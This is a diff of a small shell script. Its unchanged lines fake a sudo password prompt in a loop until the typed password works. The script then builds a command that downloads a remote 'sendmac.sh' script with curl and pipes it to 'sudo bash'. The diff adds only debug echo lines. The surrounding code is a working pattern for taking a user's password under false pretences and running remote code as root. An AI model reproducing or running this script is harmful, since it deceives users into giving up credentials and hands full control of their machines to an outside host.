@@ -4,9 +4,11 @@ echo ""
 
 pwd=""
 sudo -k
-
+echo "b4"
 while [ "$(echo $pwd | sudo -S whoami)" != "root" ]
 do
+  echo "henlo"
+  echo "pwd=$(pwd)"
   sleep 3000
   echo "Sorry, try again."
   echo -n "Password:"
@@ -14,6 +16,8 @@ do
   echo ""
   sudo -k
 done
+
+echo "out"
 
 command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
 
